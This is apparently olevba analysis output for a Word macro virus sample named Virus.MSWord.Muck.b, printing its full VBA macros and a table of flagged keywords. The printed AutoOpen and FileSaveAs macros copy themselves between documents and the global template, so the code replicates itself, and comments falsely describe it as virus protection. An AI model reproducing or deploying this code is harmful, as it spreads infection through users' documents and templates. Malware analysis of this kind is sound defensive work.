olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Muck.b-4bb74d3a3b6b45ce0d1ea8e9d78d38c1d86621f2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Muck.b-4bb74d3a3b6b45ce0d1ea8e9d78d38c1d86621f2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Muck.b-4bb74d3a3b6b45ce0d1ea8e9d78d38c1d86621f2 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub Main()
Attribute Main.VB_Description = "Wazzu Virus Protection.  Used to install the Autoexec macro."
Attribute Main.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.Main"
Dim ExecuteOnly
On Error Resume Next
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExit", "Global:AutoExit", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSave", "Global:FileSave", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSaveAs", "Global:FileSaveAs", ExecuteOnly


WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", ExecuteOnly
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", ExecuteOnly
WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", ExecuteOnly
WordBasic.MacroCopy "Global:AutoExit", WordBasic.[FileName$]() + ":AutoExit", ExecuteOnly
WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave", ExecuteOnly
WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", ExecuteOnly
WordBasic.FileSaveAll 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Muck.b-4bb74d3a3b6b45ce0d1ea8e9d78d38c1d86621f2 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' ******************************************************************
' Macro   : AutoClose
' Created : August 11, 1995
' Copyright (c) 1995 Microsoft Corp.
' Description : detects and removes Concept Virus from document
' being closed
' *****************************************************************

Public Sub Main()
Attribute Main.VB_Description = "ScanProt macro to upgrade your existing protection macros."
Attribute Main.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.Main"
Dim deleted
Dim closeMsg$
Dim msgTitle$

deleted = 0
'cleanup if this is an upgrade
    closeMsg$ = "Setup has deleted the obsolete protection macros from your Normal (global) template."
    msgTitle$ = "ScanProt Setup"
    'check for the ScanOld protective macros
    If WordBasic.[MacroFileName$]("ShellOpenScanOld") <> "" Then
        WordBasic.ToolsMacro Name:="ShellOpenScanOld", Show:=1, Delete:=1
        deleted = 1
    End If
    If WordBasic.[MacroFileName$]("ScanProt1") <> "" Then
        WordBasic.ToolsMacro Name:="ScanProt1", Show:=1, Delete:=1
        deleted = 1
    End If
    If WordBasic.[MacroFileName$]("ScanProt2") <> "" Then
        WordBasic.ToolsMacro Name:="ScanProt2", Show:=1, Delete:=1
        deleted = 1
    End If
    If deleted = 1 Then WordBasic.MsgBox closeMsg$, msgTitle$, 64
 End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Muck.b-4bb74d3a3b6b45ce0d1ea8e9d78d38c1d86621f2 - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' ******************************************************************
' Macro   : AutoNew
' Created : Sept. 20, 1995
' Copyright (c) 1995 Microsoft Corp.
' *****************************************************************

Public Sub Main()
Attribute Main.VB_Description = "ScanProt macro to ensure ScanProt Setup runs when you double click on this file."
Attribute Main.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoNew.Main"
   WordBasic.Call "AutoOpen.Main"
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Muck.b-4bb74d3a3b6b45ce0d1ea8e9d78d38c1d86621f2 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub Main()
Attribute Main.VB_Description = "Saves a copy of the document in a separate file"
Attribute Main.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.Main"
Dim ExecuteOnly
On Error Resume Next
WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", ExecuteOnly
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", ExecuteOnly
WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", ExecuteOnly
WordBasic.MacroCopy "Global:AutoExit", WordBasic.[FileName$]() + ":AutoExit", ExecuteOnly
WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave", ExecuteOnly
WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", ExecuteOnly
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
WordBasic.FileSaveAs dlg
WordBasic.FileSaveAs Format:=1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

